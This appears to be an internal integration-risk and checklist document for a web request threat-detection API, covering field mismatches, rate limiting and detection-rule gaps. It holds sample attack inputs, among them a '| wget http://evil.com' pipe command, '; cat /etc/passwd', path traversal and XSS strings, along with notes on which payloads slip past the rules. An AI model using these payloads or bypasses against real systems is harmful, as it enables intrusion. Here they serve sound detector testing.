# Integration Risks & Final Checklist

## 1. Integration Risks

### RISK-01 — Field name mismatch: `ip` vs `ip_address` (CRITICAL)
- **Where:** `datasets/processed/legit.json` and `datasets/processed/malicious.json` use `"ip"` as the key
- **API requires:** `"ip_address"`
- **Impact:** Every automated dataset replay will fail with HTTP 422
- **Fix:**
  ```python
  # When reading from datasets and calling the API:
  payload["ip_address"] = entry.pop("ip")
  ```
- **Affects:** Mouad (replay scripts), Hamza (dataset feeding)

---

### RISK-02 — `reset_at` is monotonic clock, not Unix epoch (HIGH)
- **Where:** `rate_limit_status.reset_at` in every response
- **Problem:** `time.monotonic()` resets on process restart; it cannot be converted to a human-readable timestamp using `datetime.fromtimestamp()`
- **Impact:** Ayoub's dashboard will show wrong or negative dates if displayed directly
- **Fix:** Either discard it from the DB, or compute relative time:
  ```python
  import time
  seconds_until_reset = max(0, reset_at - time.monotonic())
  ```

---

### RISK-03 — Body must be a string, not JSON object (HIGH)
- **Where:** `DetectionRequest.body` is `str`, not `dict`
- **Problem:** If you pass `"body": {"key": "value"}` (as object), Pydantic will coerce it or reject it depending on version
- **Impact:** Silent wrong results — body gets stringified oddly, patterns not matched correctly
- **Fix:** Always serialize: `"body": json.dumps(body_dict)`

---

### RISK-04 — Rate limit is in-memory and per-process (MEDIUM)
- **Where:** `SlidingWindowRateLimiter` uses a Python dict
- **Problem:** If detection engine is restarted or scaled horizontally, counters reset/split
- **Impact:** Rate limit bypass after restart; no distributed state
- **Fix (short-term):** Document that rate limit resets on restart. Long-term: replace with Redis backend.

---

### RISK-05 — `matched_rules` can be empty even when `is_threat=true` (MEDIUM)
- **Where:** Anomaly-only detections (triggering_factor = `"anomaly_score"` or `"single_anomaly"`)
- **Problem:** Logic like `if len(response["matched_rules"]) > 0: block()` will miss anomaly-triggered threats
- **Fix:** Always use `recommendation` or `is_threat` as the decision field, never `matched_rules` length

---

### RISK-06 — IP validation rejects private/test IPs with wrong format (MEDIUM)
- **Where:** `ip_address` field validated by strict IPv4/IPv6 regex
- **Problem:** Inputs like `"unknown"`, `"localhost"`, `"::1"` may fail depending on format
- **Fix:**
  - `::1` (IPv6 loopback) will fail the current pattern — it expects 8 groups of 4 hex chars
  - Always send full-form IPs: `"127.0.0.1"` for loopback, `"0:0:0:0:0:0:0:1"` for IPv6 loopback
  - **Immediate action:** Test your IP sources against the regex before deploying

---

### RISK-07 — Path traversal rules only scan `url` field (LOW)
- **Where:** Rules PT-001, PT-002, PT-003, PT-004 have `target_fields=("url",)`
- **Problem:** Path traversal in the body (e.g., JSON `{"file": "../../../etc/passwd"}`) is NOT detected
- **Impact:** Attackers can bypass by putting traversal payloads in the POST body
- **Fix:** Change `target_fields` for PT rules to include `"body"` — but test for false positives first

---

### RISK-08 — CMDI-002 regex has space-sensitivity gap (LOW)
- **Where:** Rule `CMDI-002` pattern: `\|\s*(?:cat|ls|...)` with `\s*` (zero or more spaces)
- **Problem:** The regex does match `| cat` with a space, but the benchmark shows it still misses some cases. The `\b` word boundary after the command name fails when followed by ` /etc/passwd` because `/` is not a word character — this is correct. The real gap is that `| wget http://evil.com` is missed because `wget` has a URL argument with `http://` which was in the benchmark as a FN.
- **Root cause:** The pipe pattern tests `\b` after the command. `wget http://evil.com` → `wget` matches, but the benchmark FN at index 73 shows it still fails. Likely the space between `|` and ` wget` is the issue — the URL-decoded `| wget` has a leading space before the pipe in query strings.
- **Fix:** URL-decode the `url` field before matching. The normalization module exists (`src/rules/normalization.py`) — verify it handles this case.

---

### RISK-09 — No authentication on the detection engine API (LOW)
- **Where:** `app.py` — CORS is `allow_origins=["*"]`, no auth middleware
- **Impact:** Any service on the network can call `/detect` or `/metrics`
- **Fix:** Add API key header validation or restrict to internal network only

---

### RISK-10 — `benchmark_report.json` contains ANSI escape codes in `outcome` field (LOW)
- **Where:** `"outcome": "\u001b[32mTN ✓\u001b[0m"` — terminal color codes embedded
- **Impact:** If Ayoub or Hamza parse this JSON directly, the `outcome` field is polluted with terminal codes
- **Fix:** Strip ANSI: `re.sub(r'\x1b\[[0-9;]*m', '', outcome_string)`, or regenerate the benchmark report without colors

---

## 2. Final Checklist

### Files to send

| File | Send to | Format | Priority |
|------|---------|--------|----------|
| `docs/api_contract.md` | Ayoub, Hamza, Mouad | Markdown | FIRST |
| `docs/integration_guide.md` | Ayoub, Hamza, Mouad | Markdown | FIRST |
| `docs/examples.json` | Mouad, Hamza | JSON | FIRST |
| `scripts/benchmark_report.json` | Hamza, Ayoub | JSON | SECOND |
| `datasets/processed/legit.json` | Hamza | JSON | SECOND |
| `datasets/processed/malicious.json` | Hamza | JSON | SECOND |
| `exported_requests.json` | Mouad | JSON | THIRD |

---

### Ordered delivery plan

**Step 1 — Send to everyone immediately:**
- `docs/api_contract.md` — the ground truth for all integration
- `docs/integration_guide.md` — team-specific sections

**Step 2 — Send to Mouad:**
- `docs/examples.json` — curl-ready examples + known gaps to fuzz
- `exported_requests.json` — real recorded requests to replay
- Confirm: service is running at agreed host:port

**Step 3 — Send to Hamza:**
- `datasets/processed/legit.json` + `datasets/processed/malicious.json` — training data
- `scripts/benchmark_report.json` — current detection metrics
- Warn: rename `"ip"` → `"ip_address"` when calling API
- Share: the 7-feature vector format and label mapping from `integration_guide.md`

**Step 4 — Send to Ayoub:**
- `docs/integration_guide.md` Section A (Backend workflow + DB schema)
- Confirm API host/port for your deployment
- Share: Python integration snippet from the guide
- Confirm: `reset_at` handling and body-as-string requirement

---

### Pre-integration validation checklist

Before your teammates integrate, verify these manually:

- [ ] Service starts: `uvicorn src.api.app:app --host 0.0.0.0 --port 8000`
- [ ] Health check responds: `GET /api/v1/health` → `{"status": "healthy"}`
- [ ] Legitimate request returns ALLOW
- [ ] `UNION SELECT` in URL returns BLOCK with `rule_id: "SQLI-001"`
- [ ] `<script>alert(1)</script>` in body returns BLOCK with `rule_id: "XSS-001"`
- [ ] `../../../etc/passwd` in URL returns BLOCK with `rule_id: "PT-001"`
- [ ] `; cat /etc/passwd` in URL returns BLOCK with `rule_id: "CMDI-001"`
- [ ] 101st request from same IP returns BLOCK with `triggering_factor: "rate_limit"`
- [ ] Invalid IP (e.g., `"::1"`) returns 422
- [ ] Missing `ip_address` field returns 422
- [ ] Missing `url` field returns 422
- [ ] `GET /api/v1/metrics` returns counters after above tests

---

### Known gaps to communicate to team

| Gap | Who needs to know | Action |
|-----|-------------------|--------|
| `AND 1=1` SQLi not detected | Mouad (fuzz target), Hamza (FN example) | Add SQLI rule for numeric tautologies |
| `\| wget ...` pipe CMDi missed | Mouad, Hamza | Improve URL decoding before matching |
| Body path traversal not checked | Mouad (fuzz this), Ayoub (risk) | Extend PT rule target_fields |
| IPv6 loopback `::1` rejected | Ayoub | Use `127.0.0.1` for loopback |
| Rate limit resets on restart | Ayoub | Note in dashboard, plan Redis migration |
| `reset_at` is monotonic, not epoch | Ayoub | Use relative time only |
| ANSI codes in benchmark `outcome` | Hamza | Strip before parsing |
